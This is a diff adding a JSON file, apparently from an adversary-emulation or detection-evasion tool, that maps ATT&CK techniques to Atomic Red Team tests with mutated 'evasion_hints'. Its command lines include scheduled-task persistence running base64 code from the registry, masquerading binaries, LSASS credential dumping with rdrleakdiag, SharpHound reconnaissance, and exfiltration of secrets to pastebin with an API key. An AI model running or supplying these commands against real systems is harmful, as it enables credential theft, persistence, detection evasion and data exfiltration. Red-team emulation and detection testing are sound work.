@@ -1,0 +1,103 @@
+{
+  "1": {
+    "T1053.005": {
+      "selected_test_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
+      "selected_test_name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
+      "evasion_hints": {
+        "Image": "C:\\Windows\\System32\\schtasks.exe",
+        "CommandLine": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" cscript.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc monthly /st 14:30",
+        "TargetObject": "HKCU\\SOFTWARE\\ATOMIC-T1053.005\\test"
+      },
+      "mutation_applied": true
+    },
+    "T1036.005": {
+      "selected_test_guid": "35eb8d16-9820-4423-a2a1-90c4f5edd9ca",
+      "selected_test_name": "Masquerade as a built-in system executable",
+      "evasion_hints": {
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+        "OriginalFileName": "svchost.exe",
+        "CommandLine": "rundll32.exe shell32.dll,ShellExec_RunDLL C:\\Windows\\Temp\\svchost.exe"
+      },
+      "mutation_applied": true
+    },
+    "T1003.001": {
+      "selected_test_guid": "47a539d1-61b9-4364-bf49-a68bc2a95ef0",
+      "selected_test_name": "Dump LSASS.exe using lolbin rdrleakdiag.exe",
+      "evasion_hints": {
+        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+        "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
+        "Image": "C:\\Windows\\System32\\rdrleakdiag.exe",
+        "CommandLine": "rdrleakdiag.exe /p 664 /o C:\\ProgramData\\rdrleakdiag /fullmemdmp /wait 1",
+        "DestinationIp": "127.0.0.1"
+      },
+      "mutation_applied": true
+    },
+    "T1567.003": {
+      "selected_test_guid": "c2e8ab6e-431e-460a-a2aa-3bc6a32022e3",
+      "selected_test_name": "Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)",
+      "evasion_hints": {
+        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+        "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12; $r=Invoke-RestMethod -Uri 'https://pastebin.com/api/api_post.php' -Method Post -Body @{api_dev_key='6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0';api_option='paste';api_paste_code='secrets, api keys, passwords...'}; Write-Output $r\""
+      },
+      "mutation_applied": true
+    }
+  },
+  "2": {
+    "T1059.001": {
+      "selected_test_guid": "a21bb23e-e677-4ee7-af90-6931b57b6350",
+      "selected_test_name": "Run BloodHound from local disk",
+      "evasion_hints": {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pwsh.exe",
+        "ParentImage": "C:\\Windows\\Explorer.exe",
+        "CommandLine": "pwsh.exe -NoProfile -ExecutionPolicy Bypass -Command \"Import-Module 'C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\SharpHound.ps1'; try { Invoke-BloodHound -OutputDirectory $env:Temp } catch { $_ }; exit $_.Exception.HResult; Start-Sleep 5\""
+      },
+      "mutation_applied": true
+    },
+    "T1053.005": {
+      "selected_test_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
+      "selected_test_name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
+      "evasion_hints": {
+        "Image": "C:\\Windows\\System32\\schtasks.exe",
+        "CommandLine": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" cscript.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "TargetObject": "HKCU\\SOFTWARE\\ATOMIC-T1053.005\\test"
+      },
+      "mutation_applied": true
+    },
+    "T1036.005": {
+      "selected_test_guid": "03ae82a6-9fa0-465b-91df-124d8ca5c4e8",
+      "selected_test_name": "Masquerading cmd.exe as VEDetector.exe",
+      "evasion_hints": {
+        "Image": "C:\\Windows\\System32\\VEDetector.exe",
+        "CommandLine": "C:\\Windows\\System32\\VEDetector.exe",
+        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+        "OriginalFileName": "cmd.exe"
+      },
+      "mutation_applied": true
+    },
+    "T1003.001": {
+      "selected_test_guid": "47a539d1-61b9-4364-bf49-a68bc2a95ef0",
+      "selected_test_name": "Dump LSASS.exe using lolbin rdrleakdiag.exe",
+      "evasion_hints": {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "ParentImage": "explorer.exe",
+        "CommandLine": "$lsass_pid = (Get-Process lsass).Id; $rdr = 'C:\\Windows\\System32\\rdrleakdiag.exe'; $out = 'C:\\Windows\\Temp\\memdump'; New-Item -ItemType Directory -Path $out -Force | Out-Null; & $rdr /p $lsass_pid /o $out /fullmemdmp /wait 1"
+      },
+      "mutation_applied": true
+    },
+    "T1567.003": {
+      "selected_test_guid": "c2e8ab6e-431e-460a-a2aa-3bc6a32022e3",
+      "selected_test_name": "Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)",
+      "evasion_hints": {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pwsh.exe",
+        "CommandLine": "$apiKey = '6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0'; $content = 'secrets, api keys, passwords...'; $url = 'https://pastebin.com/api/api_post.php'; $postData = @{api_dev_key=$apiKey; api_option='paste'; api_paste_code=$content}; Invoke-RestMethod -Uri $url -Method Post -Body $postData | Out-Null",
+        "ParentImage": "C:\\Windows\\System32\\explorer.exe",
+        "ParentCommandLine": "C:\\Windows\\System32\\explorer.exe"
+      },
+      "mutation_applied": true
+    }
+  }
+}
